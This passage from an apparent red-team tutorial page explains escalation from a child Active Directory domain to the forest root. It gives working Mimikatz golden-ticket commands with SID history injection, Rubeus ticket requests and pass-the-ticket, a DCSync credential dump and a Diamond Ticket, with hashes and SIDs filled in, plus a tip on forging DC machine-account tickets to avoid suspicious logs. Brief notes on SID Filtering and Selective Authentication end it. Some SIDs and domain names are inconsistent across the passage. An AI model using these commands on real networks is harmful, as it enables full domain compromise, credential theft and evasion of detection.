+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:05749eb179dbf3d3445e0a49d6701578 /service:krbtgt /targe
+t:corp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'</span>
+</code></pre></div></div>
+<p>We are going to inject the SID History inse the inter-realm TGT which will be requestes to the parent domain DC. The ticket will look like that comes from the Enterprise Admins group which allows us to elevate privileges.</p>
+
+<ul>
+  <li><strong>Invoke-Mimikatz</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><strong>Parameter</strong></th>
+      <th style="text-align: center"><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">/domain:sub.corp.local</td>
+      <td style="text-align: center">Current Domain FQDN</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/sid:S-1-5-21-268341927-4156873456-1784235843</td>
+      <td style="text-align: center">Current Domain SID</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/sids:S-1-5-21-280534878-1496970234-700767426-519</td>
+      <td style="text-align: center">SID of Enterprise Admins group (Parent Domain)</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/rc4:05749eb179dbf3d3445e0a49d6701578</td>
+      <td style="text-align: center">RC4 of the trust key (parent$)</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/user:Administrator</td>
+      <td style="text-align: center">User to impersonate</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/service:krbtgt</td>
+      <td style="text-align: center">Target service in the parent domain</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/target:corp.local</td>
+      <td style="text-align: center">Parent Domain FQDN</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/tiket:C:\Windows\Temp\trust_tkt.kirbi</td>
+      <td style="text-align: center">File to store the ticket</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Once we have the inter-realm TGT ticket forged we can ask for a TGS on the parent domain. We can ask a TGS for LDAP on the parent DC.</p>
+
+<ul>
+  <li>asktgs.exe (kekeo_old)
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\asktgs.exe ./trust_tkt.kirbi LDAP/corp-dc.corp.local
+</code></pre></div>    </div>
+  </li>
+  <li>Rubeus.exe
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgs /ticket:trust_tkt.kirbi /dc:corp-dc.corp.local /service:LDAP/corp-dc.corp.local /ptt
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Finally we can inject in on the current session:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:LDAP.mcorp-dc.moneycorp.local.kirbi
+</code></pre></div></div>
+
+<p>And execute a DCSync attack and Over-Pass-The-Hash to fully control the DC of the parent domain:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'</span>
+.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:71d04f9d50ceb1f64de7a09f23e6dc4c /dc:corp-dc.moneycorp.local /ptt
+Enter-PSSession -ComputerName corp-dc.moneycorp.local
+</code></pre></div></div>
+
+<h2 id="child-to-parent-using-krbtgt-hash">Child to Parent using krbtgt hash</h2>
+
+<p>We can also escalate to the root domain with the krbtgt hash of the current domain.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /user:Administrator /domain:sub.corp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ticket:C:\temp\trust_forest_tkt.kirbi"'</span>
+</code></pre></div></div>
+<ul>
+  <li><strong>Invoke-Mimikatz</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><strong>Parameter</strong></th>
+      <th style="text-align: center"><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">/domain:sub.corp.local</td>
+      <td style="text-align: center">Current Domain FQDN</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/sid:S-1-5-21-268341927-4156873456-1784235843</td>
+      <td style="text-align: center">Current Domain SID</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/sids:S-1-5-21-280534878-1496970234-700767426-519</td>
+      <td style="text-align: center">SID of Enterprise Admins group (Parent Domain)</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/user:Administrator</td>
+      <td style="text-align: center">User to impersonate</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/krbtgt:a9b30e5b0dc865eadcea9411e4ade72d</td>
+      <td style="text-align: center">krbtgt hash of Current Domain</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">/tiket:C:\Windows\Temp\trust_tkt.kirbi</td>
+      <td style="text-align: center">File to store the ticket</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Once created we can import and we don’t need to ask for a TGS.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:trust_forest_tkt.kirbi
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
+</code></pre></div></div>
+
+<p>Avoid Suspicious logs by using DC machine accounts.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-41456871508-1792461683 /groups:516 /sids:S-1-5-21-560323961-2032768757-2425134131-516,S-1-5-9 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ptt"'</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>RedTeam Notes:</strong> Avoid suspicious logs adding</p>
+
+  <p><code class="highlighter-rouge">/groups:516</code></p>
+
+  <p><code class="highlighter-rouge">/sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9</code></p>
+
+  <p>S-1-5-21-280534878-1496970234-700767426-516 - Domain Controllers</p>
+
+  <p>S-1-5-9 - Enterprise Domain Controllers</p>
+</blockquote>
+
+<p>It can also bee possible with a <code class="highlighter-rouge">Diamond Ticket</code> and rubeus.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /tickeruserid:500 /groups:512 /sids:S-1-5-21-560323961-2032768757-2425134131-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa  /nowrap
+</code></pre></div></div>
+
+<h2 id="sid-filtering-defending">SID Filtering (Defending)</h2>
+
+<p><strong>SID Filtering</strong> avoids attacks which abuses SID history attribute across forest trust.</p>
+
+<p>By default SID Filtering is enabled on all inter-forests trusts. Intra-Forests trusts are assumed secured by default. But, since SID Filtering has potential to break applications and user access, it is often disabled.</p>
+
+<p>Microsoft considers a forest and no the domain to be a security boundary so its disabled by default.</p>
+
+<ul>
+  <li>ParentChild Trust -&gt; Disabled</li>
+  <li>External Trust -&gt; Enabled</li>
+</ul>
+
+<h2 id="selective-authentication-defending">Selective Authentication (Defending)</h2>
+
+<p>In an inter-forest trust (External Trust), if Selective Authentication is configured, users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given.</p>
 
 			</article>
 		</section>
